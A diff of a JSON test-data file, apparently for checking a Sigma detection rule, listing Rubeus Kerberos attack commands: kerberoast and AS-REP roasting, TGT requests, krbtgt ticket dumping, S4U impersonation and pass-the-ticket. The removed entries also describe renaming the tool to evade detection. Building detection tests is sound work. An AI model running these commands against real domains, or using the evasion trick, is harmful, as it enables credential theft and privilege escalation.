@@ -1,14 +1,28 @@
+```json
 [
   {
-    "output": "not_malware.exe kerberoast /outfile:C:\\Windows\\Temp\\hashes.txt",
-    "explanation": "This command uses omission (renaming Rubeus.exe to not_malware.exe) and insertion (adding quotes around the executable name) to bypass the Sigma rule that detects 'Rubeus.exe' in the command line."
+    "output": "\"C:\\AtomicRedTeam\\ExternalPayloads\\rubeus.exe\" asktgt /user:Administrator /password:Password /domain:THAIMX /outfile:ticket.kirbi",
+    "explanation": "This command is a simplified version of the original, using direct execution of Rubeus with the 'asktgt' parameter, which is explicitly detected by the Sigma rule."
   },
   {
-    "output": "not_malware.exe asreproast /user:admin /format:hashcat",
-    "explanation": "This command uses omission (renaming Rubeus.exe to not_malware.exe) and insertion (adding quotes around the executable name) to bypass the Sigma rule that detects 'Rubeus.exe' in the command line."
+    "output": "\"C:\\AtomicRedTeam\\ExternalPayloads\\rubeus.exe\" kerberoast /outfile:C:\\AtomicRedTeam\\ExternalPayloads\\rubeus_output.txt",
+    "explanation": "This command uses the 'kerberoast' parameter, which is directly flagged by the Sigma rule's detection logic."
   },
   {
-    "output": "not_malware.exe kerberoast /outfile:pass.txt",
-    "explanation": "This command uses omission (renaming Rubeus.exe to not_malware.exe) and insertion (adding quotes around the executable name) to bypass the Sigma rule that detects 'Rubeus.exe' in the command line."
+    "output": "\"C:\\AtomicRedTeam\\ExternalPayloads\\rubeus.exe\" dump /service:krbtgt",
+    "explanation": "This command uses the 'dump /service:krbtgt' parameter, which is explicitly detected by the Sigma rule."
+  },
+  {
+    "output": "\"C:\\AtomicRedTeam\\ExternalPayloads\\rubeus.exe\" s4u /user:Administrator /impersonate:Administrator /dc:THAIMX",
+    "explanation": "This command uses the 's4u' parameter, which is flagged by the Sigma rule's detection logic."
+  },
+  {
+    "output": "\"C:\\AtomicRedTeam\\ExternalPayloads\\rubeus.exe\" hash /password:Password /user:Administrator /domain:THAIMX",
+    "explanation": "This command uses the 'hash /password:' parameter, which is explicitly detected by the Sigma rule."
+  },
+  {
+    "output": "\"C:\\AtomicRedTeam\\ExternalPayloads\\rubeus.exe\" ptt /ticket:ticket.kirbi",
+    "explanation": "This command uses the 'ptt /ticket:' parameter, which is explicitly flagged by the Sigma rule."
   }
 ]
+```
